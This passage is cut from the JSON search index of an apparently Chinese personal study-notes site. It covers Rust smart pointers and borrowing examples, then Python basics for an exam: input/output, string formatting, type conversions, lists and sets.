<p>\u7c7b\u4f3c\u7684<code>\uff1f</code>\u200b\u5b8f\u4e5f\u53ef\u4ee5\u505aOption\u7684\u4f20\u64ad</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#11","title":"11. \u5305\u548c\u6a21\u5757","text":"<ul> <li>todo</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#12","title":"12. \u667a\u80fd\u6307\u9488","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#121-rc-and-arc","title":"12.1 Rc and Arc","text":"<p>\u5f53\u6211\u4eec\u6709\u65f6\u4e0d\u5f97\u4e0d\u8fdd\u53cdRust\u7684\u89c4\u5219\uff0c\u4f7f\u5f97\u4e00\u4e2a\u503c\u6709\u591a\u4e2a\u6240\u6709\u8005\u7684\u60c5\u51b5\uff0c\u5c31\u9700\u8981\u7528\u5230\u667a\u80fd\u6307\u9488\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f8b\u5982<code>Rc</code>\u200b\u5c31\u662f\u4e00\u4e2a\u5904\u7406\u8be5\u95ee\u9898\u7684\u5e38\u7528\u505a\u6cd5</p> <pre><code>use std::rc::Rc;\nfn main() {\n    let a = Rc::new(String::from(\"hello, world\"));\n    let b = Rc::clone(&amp;a);\n\n    assert_eq!(2, Rc::strong_count(&amp;a));\n    assert_eq!(Rc::strong_count(&amp;a), Rc::strong_count(&amp;b))\n}\n</code></pre> <p>\u6240\u8c13<code>Rc::clone</code>\u200b\u4ec5\u4ec5\u62f7\u8d1d\u4e86\u667a\u80fd\u6307\u9488\u672c\u8eab\uff0c\u5e76\u672a\u5bf9\u5e95\u5c42\u7684<code>String</code>\u200b\u505a\u51fa\u62f7\u8d1d\uff0c\u5e76\u4e14\u4f1a\u4f7f\u5f97\u8ba1\u6570\u5668\u52a0\u4e00\uff0c\u4f46\u662f\u7f3a\u9677\u5728\u4e8e<code>Rc</code>\u200b\u4ec5\u80fd\u5904\u7406\u591a\u4e2a\u4e0d\u53ef\u53d8\u5f15\u7528\u7684\u60c5\u5f62</p> <pre><code>use std::rc::Rc;\nuse std::thread;\n\nfn main() {\n    let s = Rc::new(String::from(\"\u591a\u7ebf\u7a0b\u6f2b\u6e38\u8005\"));\n    for _ in 0..10 {\n        let s = Rc::clone(&amp;s);\n        let handle = thread::spawn(move || {\n           println!(\"{}\", s)   //error[E0277]: `Rc&lt;String&gt;` cannot be sent between threads safely\n        });\n    }\n}\n</code></pre> <p>\u5e76\u4e14\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c<code>Rc</code>\u200b\u5e95\u5c42\u7684\u8ba1\u6570\u5668\u662f\u6ca1\u6709\u7ebf\u7a0b\u5b89\u5168\u4fdd\u62a4\u7684\uff0c\u5982\u4e0a\u56fe\u7684s\u4e0d\u80fd\u88ab\u4f20\u5165\u591a\u7ebf\u7a0b\u4ee3\u7801\u4e2d\uff0c\u56e0\u6b64\u76f8\u5bf9\u7684\u6807\u51c6\u5e93\u91cc\u8fd8\u6709<code>Arc</code>\u200b\uff0c\u8868\u793aatomic rc\u5b58\u5728\uff0c\u53ef\u4ee5\u5728\u591a\u7ebf\u7a0b\u4ee3\u7801\u4e2d\u4f7f\u7528\uff0c\u4e4b\u6240\u4ee5\u9700\u8981\u533a\u5206\u662f\u56e0\u4e3a\u7ebf\u7a0b\u5b89\u5168\u7684\u4fdd\u62a4\u662f\u6709\u5f00\u9500\u7684</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#122-cell-and-refcell","title":"12.2 Cell and RefCell","text":"<pre><code>fn main() {\n    let mut x = String::from(\"hello\");\n    let one = &amp;x;\n    x.push_str(\"word\");\n    let two = &amp;x;\n    println!(\"{}, {}\", one, two);\n}\n</code></pre> <p>\u6709\u65f6\u6211\u4eec\u4f1a\u60f3\u5199\u8fd9\u6837\u7684\u4ee3\u7801\uff0c\u4e0a\u8ff0\u4ee3\u7801\u770b\u7740\u6ca1\u95ee\u9898\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u7684\u4e8b\uff0c\u6211\u4eec\u5728<code>push_str</code>\u200b\u5904\u5bf9x\u8fdb\u884c\u4e86\u53ef\u53d8\u5f15\u7528\uff0c\u4e4b\u540e\u5c31\u4e0d\u80fd\u5bf9\u5176\u505a\u4efb\u4f55\u5176\u4ed6\u5f15\u7528\u4e86\uff0c\u56e0\u6b64\u8fd9\u6bb5\u4ee3\u7801\u4f1a\u62a5\u9519</p> <pre><code>use std::cell::Cell;\nfn main() {\n  let c = Cell::new(\"asdf\");\n  let one = c.get();\n  c.set(\"qwer\");\n  let two = c.get();\n  println!(\"{},{}\", one, two);\n}\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Cell\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0cCell\u4f1a\u5728get\u8d4b\u503c\u4e4b\u540e\u81ea\u52a8\u505a\u62f7\u8d1d\u5de5\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u7528set\u6765\u4fee\u6539\u8fd9\u4e2a\u503c\uff0c\u4f46\u662fCell\u53ea\u9002\u7528\u4e8e\u5b9e\u73b0\u4e86Copy\u529f\u80fd\u7684\u7c7b\u578b\uff0c\u5982\u679c\u8be5\u7c7b\u578b\u672a\u66fe\u5b9e\u73b0Copy\u529f\u80fd\uff0c\u5219\u9700\u8981\u4f7f\u7528RefCell\uff0cRefCell\u7684\u529f\u80fd\u5728\u4e8e\u628a\u68c0\u67e5\u4ece\u7f16\u8bd1\u65f6\u63a8\u8fdf\u5230\u8fd0\u884c\u65f6</p> <p>\u4e00\u4e2a\u5e38\u7528\u7684\u505a\u6cd5\u5c31\u662f\u628aRc\u548cRefCell\u5408\u5e76\u8d77\u6765\u4f7f\u7528\uff0c\u53ef\u4ee5\u4f7f\u5f97\u53d8\u91cf\u7684\u4f7f\u7528\u66f4\u52a0\u7075\u6d3b</p> <pre><code>use std::cell::RefCell;\nuse std::rc::Rc;\nfn main() {\n    let s = Rc::new(RefCell::new(\"\u6211\u5f88\u5584\u53d8\uff0c\u8fd8\u62e5\u6709\u591a\u4e2a\u4e3b\u4eba\".to_string()));\n\n    let s1 = s.clone();\n    let s2 = s.clone();\n    // let mut s2 = s.borrow_mut();\n    s2.borrow_mut().push_str(\", oh yeah!\");\n\n    println!(\"{:?}\\n{:?}\\n{:?}\", s, s1, s2);\n}\n</code></pre> <p>\u7531\u4e8e <code>Rust</code>\u200b \u7684 <code>mutable</code>\u200b \u7279\u6027\uff0c\u4e00\u4e2a\u7ed3\u6784\u4f53\u4e2d\u7684\u5b57\u6bb5\uff0c\u8981\u4e48\u5168\u90fd\u662f <code>immutable</code>\u200b\uff0c\u8981\u4e48\u5168\u90e8\u662f <code>mutable</code>\u200b\uff0c\u4e0d\u652f\u6301\u9488\u5bf9\u90e8\u5206\u5b57\u6bb5\u8fdb\u884c\u8bbe\u7f6e\u3002\u6bd4\u5982\uff0c\u5728\u4e00\u4e2a <code>struct</code>\u200b \u4e2d\uff0c\u53ef\u80fd\u53ea\u6709\u4e2a\u522b\u7684\u5b57\u6bb5\u9700\u8981\u4fee\u6539\uff0c\u800c\u5176\u4ed6\u5b57\u6bb5\u5e76\u4e0d\u9700\u8981\u4fee\u6539\uff0c\u4e3a\u4e86\u4e00\u4e2a\u5b57\u6bb5\u800c\u5c06\u6574\u4e2a <code>struct</code>\u200b \u53d8\u4e3a <code>&amp;mut</code>\u200b \u4e5f\u662f\u4e0d\u5408\u7406\u7684\u3002</p> <p>\u6240\u4ee5\uff0c\u5b9e\u73b0 \u5185\u90e8\u53ef\u53d8\u6027 \u7684 <code>Cell</code>\u200b \u548c <code>RefCell</code>\u200b \u6b63\u662f\u4e3a\u4e86\u89e3\u51b3\u8bf8\u5982\u8fd9\u7c7b\u95ee\u9898\u5b58\u5728\u7684\uff0c\u901a\u8fc7\u5b83\u4eec\u53ef\u4ee5\u5b9e\u73b0 <code>struct</code>\u200b \u90e8\u5206\u5b57\u6bb5\u53ef\u53d8\uff0c\u800c\u4e0d\u7528\u5c06\u6574\u4e2a <code>struct</code>\u200b \u8bbe\u7f6e\u4e3a <code>mutable</code>\u200b\u3002</p> <p>\u5982\u679c\u9700\u8981\u4fdd\u8bc1\u7684\u7ebf\u7a0b\u5b89\u5168\u7684<code>RefCell</code>\u200b\u53ef\u4ee5\u8003\u8651<code>UPSafeCell</code>\u200b</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#rust_1","title":"Rust\u5b9e\u4f8b","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/Rust%20%E5%85%A5%E9%97%A8/Rust%20%E5%85%A5%E9%97%A8/#iteration-invalidation","title":"iteration invalidation","text":"<pre><code>fn main(){\n    let v = vec![1,2,3];\n    let p = &amp;v[1];\n    v.push(4);\n    println!(\"v[1]:{}\", *p);\n}\n</code></pre> <p>\u8ba9\u6211\u4eec\u8003\u8651C++\u7684\u60c5\u5f62\uff0c\u4e0a\u8ff0\u4ee3\u7801\u5176\u5b9e\u975e\u5e38\u7684\u4e0d\u5b89\u5168\uff0c\u56e0\u4e3avector\u7c7b\u578b\u662f\u5b58\u5728\u6269\u5bb9\u91cd\u6574\u7684\uff0c\u5982\u679c\u6211\u4eec\u5fd8\u8bb0\u4f7f\u7528\u8fed\u4ee3\u5668\u800c\u53ea\u662f\u91c7\u7528\u666e\u901a\u6307\u9488\u53bb\u8bbf\u95ee\uff0c\u5728\u6269\u5bb9\u91cd\u6574\u4e4b\u540e\u5c31\u4f1a\u7559\u7ed9\u6211\u4eec\u4e00\u4e2a\u91ce\u6307\u9488</p> <p>\u800c\u5728Rust\u7f16\u8bd1\u5668\u4e2d\uff0c\u76f4\u63a5\u4e0d\u5141\u8bb8\u6267\u884c\u4e0a\u8ff0\u4ee3\u7801\uff0c\u539f\u56e0\u5728\u4e8ep\u4f5c\u4e3a\u4e00\u4e2a\u6307\u9488\uff0c\u4e0d\u53ef\u53d8\u5730\u501f\u7528\u4e86v\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\uff0c\u800cv\u9700\u8981push\u7684\u65f6\u5019\uff0c\u9700\u8981\u53ef\u53d8\u5730\u501f\u7528v\u4e2d\u6240\u6709\u5143\u7d20\uff0c\u6b64\u65f6\u4e24\u4e2a\u64cd\u4f5c\u53d1\u751f\u51b2\u7a81</p> <p>\u4f46\u662f\u4e0d\u53ef\u5426\u8ba4\u7684\u662f\uff0c\u867d\u7136Rust\u7f16\u8bd1\u5668\u53ef\u4ee5\u505a\u5f88\u5f3a\u5927\u7684\u68c0\u67e5\uff0c\u4f46\u662f\u5176\u4e0d\u53ef\u907f\u514d\u5730\u4f1a\u9519\u5224\u4e00\u4e9b\u672c\u8eab\u662f\u5b89\u5168\u7684\u591a\u501f\u7528\u60c5\u5f62\u3002\u5bf9\u4e8e\u6b64\u79cd\u95ee\u9898\u6211\u4eec\u5f80\u5f80\u901a\u8fc7\u7a0d\u5fae\u8c03\u6574\u4ee3\u7801\u5c31\u53ef\u4ee5\u89e3\u51b3</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/","title":"python \u5165\u95e8","text":"<p>python</p> <p>\u4e3b\u8981\u662f\u5e94\u4ed8\u671f\u672b\u8003\u8bd5\u5199\u7684\u7b14\u8bb0\uff0c\u91cc\u5934\u5305\u542b\u4e86\u4e0d\u5c11\u83ab\u540d\u5947\u5999\u7684\u7ec6\u8282doge</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#part1-io","title":"Part1 IO","text":"<pre><code>m = int(input(\"m = \"))\nprint(m)\n</code></pre> <p>input \u5185\u90e8\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u8f93\u5165\u63d0\u793a\u8bcd\uff0cint\u5c06\u8f93\u5165\u7684\u4e1c\u897f\u8f6c\u5316\u7279\u5b9a\u7684\u7c7b\u578b</p> <p>\u9ed8\u8ba4\u7684\u8f93\u51fa\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u7528\u2018\uff0c\u2019\u9694\u5f00\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u7528\u7a7a\u683c\u9694\u5f00</p> <pre><code>a,b,c=[1,2,3];\nprint(a,b,c)\nprint(a,end='')  \u6700\u540e\u4e0d\u6362\u884c\nprint(a,b,sep='')  \u539f\u672c\u7528\u7a7a\u683c\u9694\u5f00\u7684\u6570\u636e\u53d6\u6d88\u7a7a\u683c  \n</code></pre> <p>\u8f93\u51fa\u4e24\u4e2a\u5b57\u7b26\u4e32\u5982\u679c\u662f\u5355\u7eaf\u7684\u7a7a\u683c\u9694\u5f00\uff0c\u7ed3\u679c\u4e2d\u5c31\u4e0d\u52a0\u7a7a\u683c</p> <pre><code>print(\"aaa\"    \"bbb\")  aaabbb\n</code></pre> <p>\u683c\u5f0f\u5316\u8f93\u5165\u8f93\u51fa</p> <p>\u8f93\u5165</p> <p>\u4e00\u884c\u4e2d\u8f93\u5165\u591a\u4e2a\u6574\u6570 \u5e76\u4e14\u7528\u9017\u53f7\u9694\u5f00\uff0cinput\u7684\u9ed8\u8ba4\u7ed3\u679c\u90fd\u662f\u5b57\u7b26\u4e32\uff0csplit\u5185\u90e8\u4e0d\u52a0\u81ea\u52a8\u662f\u6309\u7167\u7a7a\u683c\u5206\u5272</p> <pre><code>a, b, c = map(int,input().split(','))\n</code></pre> <p>\u4e0a\u8ff0\u8f93\u5165\u53ea\u9488\u5bf9int\u6570\u636e\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u6570\u636e\u662f5.0\uff0c\u5c31\u4f1a\u6709\u95ee\u9898\uff0c\u5982\u679c\u8981cover\u6240\u6709\u6709\u5173\u6570\u636e\u7684\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u7528eval</p> <pre><code>a,b,c=map(eval, input().split())\n</code></pre> <p>\u8f93\u51fa</p> <pre><code>a, b = 5, 10\nprint('%d * %d = %d' % (a, b, a * b))\nprint(f'{a} * {b} = {a * b}') \u9700\u8981\u5728\u5176\u524d\u9762\u52a0\u5165f\nprint(\"{}{:&gt;14.1f}\".format(a,b)\n'{:10.2f}' \u536010\u4e2a\uff0c\u540c\u65f6\u4fdd\u7559\u4e24\u4f4d\u5c0f\u6570\uff0c\u4f46\u662f\u5982\u679c\u672c\u8eab\u6570\u5b57\u5c31\u6bd410\u4f4d\u591a\uff0c\u90a3\u4e48\u8fd8\u662f\u4f1a\u8d85\u51fa\u5341\u4f4d2\n</code></pre> <p>\u4fdd\u7559\u5c0f\u6570\u5e76\u4e14\u53f3\u5bf9\u9f50</p> <pre><code>fahr = i * 1.8 + 32\nstfahr = \"{}\".format(fahr,'.2f')\nprint(\"{}{:&gt;14}\".format(i,stfahr))\n</code></pre> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u5982\u679c\u4e0d\u52a0&lt; &gt; \u5bf9\u4e8e\u6574\u6570\u9ed8\u8ba4\u662f&gt;,\u4e5f\u5c31\u662f\u5411\u524d\u8865\u7a7a\u683c\uff1b\u5bf9\u4e8e\u5b57\u7b26\u4e32\u9ed8\u8ba4\u662f&lt;\uff0c\u4e5f\u5c31\u662f\u5411\u540e\u8865\u7a7a\u683c\uff0c\u201c\uff1a\u201d\u524d\u9762\u7684\u6570\u5b57\u662f\u7528\u6765\u5224\u5b9a\u662fformat\u91cc\u7684\u53c2\u6570\u7684\u7b2c\u51e0\u4e2a</p> <pre><code>a = 100\nprint(\"{:8}\".format(a))\nprint(\"{:&gt;8}\".format(a))\nprint(\"{:&lt;8}\".format(a))\nprint(\"{:08}\".format(a))\nprint(\"{:0&lt;8}\".format(a))\nprint(\"{:.2f}\".format(a))\nprint(\"{:0&lt;8.2f}\".format(10))\nprint(\"{:0&gt;8.2f}\".format(10))\n</code></pre> <p>\u7ed3\u679c\u4e3a</p> <p>\u200b\u200b</p> <ul> <li>print(\"{:0^8}\".format(a)) \u5c45\u4e2d\u5bf9\u9f50</li> <li>print(\"{:,}\".format(a)) \u5343\u5206\u4f4d</li> </ul> <p>\u5192\u53f7\u540e\u9762\u7684\u4e1c\u897f\u8868\u793a\u683c\u5f0f\uff0c\u5192\u53f7\u524d\u9762\u7684\u4e1c\u897f\u8868\u793a\u662fformat\u4e2d\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570</p> <p>b d x o \u524d\u9762\u52a0\u4e0a# \u53ef\u4ee5\u663e\u793a 0x 0o\u7b49</p> <p>{}\u5185\u90e8\u53ea\u80fd\u653e\u5b57\u9762\u91cf\uff0c\u65e0\u6cd5\u8bc6\u522b\u53d8\u91cf</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#part2-type","title":"Part2 type","text":"<ul> <li> <p>\u200b<code>int()</code>\u200b\uff1a\u5c06\u4e00\u4e2a\u6570\u503c\u6216\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u6574\u6570\uff0c\u53ef\u4ee5\u6307\u5b9a\u8fdb\u5236(\u53ea\u9488\u5bf9\u5b57\u7b26\u4e32\uff0c\u8be5\u6307\u5b9a\u8fdb\u5236\u7684\u542b\u4e49\u662f\u6307\u628a\u8be5\u5b57\u7b26\u4e32\u5f53xx\u8fdb\u5236\u6765\u770b)\u3002</p> </li> <li> <p>\u88ab\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\u5de6\u53f3\u53ef\u4ee5\u6709\u7a7a\u683c\uff0c\u6709\u6548\u5b57\u7b26\u5185\u90e8\u4e0d\u80fd\u6709\u7a7a\u683c</p> </li> <li>\u5bf9\u4e8ebool\u7c7b\u578b\uff0cint(True) \u662f 1\uff0cint(False) \u662f 0</li> <li>int\u53ef\u4ee5\u8f6c\u6362\u6570\u5b5710.0\u4f46\u662f\u65e0\u6cd5\u8f6c\u6362\"10.0\"\uff0c\u5bf9\u4e8e\u6570\u5b57\u7684\u8f6c\u6362\u662f\u5411\u4e0b\u53d6\u6574</li> <li>\u200b<code>float()</code>\u200b\uff1a\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216\u6574\u6570\u8f6c\u6362\u6210\u6d6e\u70b9\u6570\u3002</li> <li>\u200b<code>str()</code>\u200b\u200b\u200b\u200b\u200b\uff1a\u5c06\u6307\u5b9a\u7684\u5bf9\u8c61\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u53ef\u4ee5\u6307\u5b9a\u7f16\u7801\u3002</li> <li> <p>\u200b<code>chr()</code>\u200b\u200b\u200b\u200b\u200b\uff1a\u5c06\u6574\u6570\u8f6c\u6362\u6210\u8be5\u7f16\u7801\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff08\u4e00\u4e2a\u5b57\u7b26\uff09\u3002</p> </li> <li> <p>\u200b<code>chr(97) == 'a'</code>\u200b</p> </li> <li> <p>\u200b<code>ord()</code>\u200b\u200b\u200b\u200b\u200b\uff1a\u5c06\u5b57\u7b26\u4e32\uff08\u4e00\u4e2a\u5b57\u7b26\uff09\u8f6c\u6362\u6210\u5bf9\u5e94\u7684\u7f16\u7801\uff08\u6574\u6570\uff09\u3002</p> </li> <li> <p>\u5982\u679c\u662f\u5355\u4e2a\u5b57\u7b26\uff0c\u8f6c\u6362\u6210ASCII\uff1b\u5982\u679c\u662f\u4e2d\u6587\uff0c\u8f6c\u6362\u6210Unicode</p> </li> <li>\u200b<code>list()</code>\u200b: \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u5355\u4e2a\u5b57\u7b26\u7684\u5217\u8868</li> <li>\u200b<code>bool()</code>\u200b: \u53ea\u67090\uff0c\u7a7a\u5b57\u7b26\u4e32\u7a7a\u5217\u8868\uff0cNone\u8f6c\u6362\u8fc7\u6765\u65f6False\uff0c\u5176\u4ed6\u8f6c\u6362\u8fc7\u6765\u7684\u90fd\u662fTrue</li> <li>\u200b<code>set()</code>\u200b: \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210set\u7684\u65f6\u5019\uff0c\u6bcf\u4e2achar</li> <li>\u200b<code>list()</code>\u200b \u5c06\u5b57\u7b26\u4e32\u8f6c\u6210list\u7684\u65f6\u5019\uff0c\u6bcf\u4e2achar</li> </ul> <p>\u5bf9\u4e8ePython\u4e2d\u7684\u7c7b\u578b\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528dir\uff0c\u67e5\u8be2\u5176\u6240\u6709\u7684\u65b9\u6cd5</p> <pre><code>dir(tuple)\n</code></pre> <p>Python\u4e2d\u6ca1\u6709\u5355\u4e2a\u5b57\u7b26\uff0c\u90fd\u662f\u5b57\u7b26\u4e32</p> <p>\u6d6e\u70b9\u6570\u5728\u5224\u65ad\u5927\u5c0f\u7684\u65f6\u5019\u8981\u6ce8\u610f\u53ef\u80fd\u5b58\u5728\u4e00\u5b9a\u7684\u5dee</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#int","title":"int","text":"<pre><code>a = int(\"123a\",16)\na = int(126.5588)\n</code></pre> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u5236\u5b9a\u5b57\u7b26\u4e32\u7684\u8fdb\u5236\uff0c\u5982\u679c\u4e0d\u52a016\uff0c\u524d\u9762\u8fd9\u4e2a\u5b57\u7b26\u4e32\u4f1a\u88ab\u9ed8\u8ba4\u4e3a\u5341\u8fdb\u5236\uff0c\u4f1a\u53d1\u751f\u9519\u8bef</p> <p>bin(12.5) \u662f\u9519\u8bef\u7684 bin\u53ea\u80fd\u9488\u5bf9int</p> <p>\u56db\u820d\u516d\u5165\u4e94\u5e73\u5206</p> <p>int\u7684\u8fdb\u5236\u53ef\u4ee5\u4e92\u76f8\u8f6c\u6362\uff0c\u5982\u4e0a\u8ff0\u4ee3\u7801\u6240\u793a\uff0c\u4f46\u662f\u53ea\u80fd\u4ecestring\u8f6c\u4e3aint\uff0c\u5982\u679c\u51fa\u73b0</p> <pre><code>int(\"92\",8)\n</code></pre> <p>\u8fd9\u79cd\u60c5\u5f62\uff0c\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a92\u5e76\u4e0d\u662f\u4e00\u4e2a\u5408\u6cd5\u76848\u8fdb\u5236\u6570</p> <ul> <li>16\u8fdb\u5236 hex(16)  = 0x10</li> <li>2\u8fdb\u5236 bin(10) = 0b1010</li> </ul> <p>\u4e0a\u8ff0\u8fd9\u4e9bhex\uff0cbin\uff0coct\u751f\u6210\u7684\u7c7b\u578b\u90fd\u662fstr\uff0c\u5e76\u4e140x\u548c0b\u662f\u5b57\u7b26\u4e32\u7684\u4e00\u90e8\u5206\uff0c\u5982\u679c\u8981\u53ea\u622a\u53d601\u7684\u90e8\u5206\u7684\u8bdd\uff0c\u9700\u8981\u4f7f\u7528\u5207\u7247[2:]</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#list","title":"list","text":"<p>\u5217\u8868\u5e76\u975e\u6570\u7ec4\uff0c\u6570\u7ec4\u6709\u5355\u72ec\u7684\u5bf9\u8c61</p> <pre><code>peopleName = [\"a\",\"b\",\"c\"]\nlen(peopleName)\nnewlist = peopleName [1:2] \u622a\u53d6peopleName[1]\n</code></pre> <p>\u5217\u8868\u7684\u7d22\u5f15</p> <pre><code>[...]\n0 1 2 3 ... \n... -3 -2 -1\n</code></pre> <p>\u7528sorted\u53bb\u5904\u7406\u5217\u8868\uff0c\u539f\u5217\u8868\u4e0d\u53d8\uff0c\u8fd4\u56de\u6392\u5e8f\u597d\u7684\uff1b\u7528sort\u662f\u76f4\u63a5\u5728\u539f\u5217\u8868\u4e0a\u8fdb\u884c\u6392\u5e8f</p> <p>\u5217\u8868\u7684\u5207\u7247\u662f\u5de6\u95ed\u53f3\u5f00\u7684</p> <p>\u5217\u8868\u6784\u9020\u5668</p> <pre><code>L1 = [c for c in range(101)]\n</code></pre> <p>\u5176\u57fa\u672c\u5f62\u5f0f\u4e3a</p> <pre><code>L1 = [\u4e0ec\u6709\u5173\u7684\u8868\u8fbe\u5f0f for c in list if \u7b5b\u9009\u5f0f]\n</code></pre> <p>\u5207\u7247\u7684\u5f62\u5f0f\uff0cbegin\u548cend\u90fd\u53ef\u4ee5\u8d85\u8fc7\uff0c\u4f1a\u81ea\u52a8\u8865\u5230\u8d77\u59cb\u548c\u6700\u540e</p> <pre><code>l [begin:end:\u987a\u5e8f\u548c\u95f4\u9694]\n</code></pre> <p>\u5e38\u7528\u7684\u65b9\u6cd5</p> <ul> <li>append \u628a\u5143\u7d20\u52a0\u5230\u5217\u8868\u672b\u5c3e</li> <li>remove \u5220\u9664\u7b2c\u4e00\u4e2a\u548c\u8fd9\u4e2a\u5143\u7d20\u76f8\u540c\u7684\u5143\u7d20  \u8fd4\u56de\u503c\u4e3aNone</li> <li>max(list) min(list) \u627e\u5230\u6700\u5927\u6700\u5c0f \u4f46\u662f\u5185\u90e8\u5143\u7d20\u90fd\u53ef\u6bd4</li> <li>len(list)</li> <li>\u200b<code>a in list</code>\u200b <code>a not in list</code>\u200b \u8fd4\u56debool</li> <li>index(element) \u627e\u5230\u8be5element\u7684\u4e0b\u6807\uff0c\u5982\u679c\u672a\u627e\u5230\u76f4\u63a5\u62a5\u9519</li> <li>clear() \u6e05\u7a7a</li> <li>count</li> <li>copy</li> <li>extend \u540c+=</li> <li>insert(index, x) \u5728\u6307\u5b9a\u4e0b\u6807\u4e2d\u63d2\u5165\u5355\u4e2a\u5143\u7d20\uff0c\u63d2\u5165\u5217\u8868\u4f1a\u53d8\u6210\u4e8c\u7ea7\u7684</li> <li>pop(index) \u8fd4\u56de\u5e76\u5220\u9664\u6307\u5b9a\u5143\u7d20\uff0c\u9ed8\u8ba4\u4e3a-1</li> <li>reverse() \u7ffb\u8f6c\u81ea\u5df1\uff0c\u65e0\u8fd4\u56de\u503c</li> <li>sort()</li> <li><code>python   l = [1] * 3    [1,1,1] \u8fd9\u7b97\u662f\u62f7\u8d1d</code></li> </ul> <p>\u590d\u5236\u548c\u62f7\u8d1d</p> <p>\u5982\u679c\u53ea\u662f\u5355\u7eaf\u7684\u8d4b\u503c\uff0c\u5219\u4e24\u4e2a\u53d8\u91cf\u6307\u5411\u540c\u4e00\u4e2alist</p> <p>\u5982\u679c\u8981\u505a\u62f7\u8d1d\uff0c\u90a3\u4e48\u9700\u8981\u4f7f\u7528\u5207\u7247<code>list2 = list1[:]</code>\u200b\uff0c\u4f46\u662f\u5207\u7247\u7684\u62f7\u8d1d\u4ec5\u5bf9\u4e00\u5c42\uff0c\u5185\u90e8\u8fd8\u662f\u5f15\u7528</p> <p>\u200b<code>list.copy()</code>\u200b\u4e5f\u662f\u4e00\u5c42\u62f7\u8d1d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#set","title":"set","text":"<p>\u548c\u5b57\u5178\u4e00\u6837\u90fd\u7528{}\uff0c\u5982\u679c\u8981\u521b\u5efa\u4e00\u4e2a\u7a7aset\uff0cset\u7684\u5143\u7d20\u548c\u5b57\u5178\u7684\u952e\u4e00\u6837\uff0c\u5fc5\u987b\u662f\u4e0d\u53ef\u53d8\u5bf9\u8c61</p> <pre><code>a = {} \u7a7a\u5b57\u5178\na = set() \u7a7aset\n</code></pre> 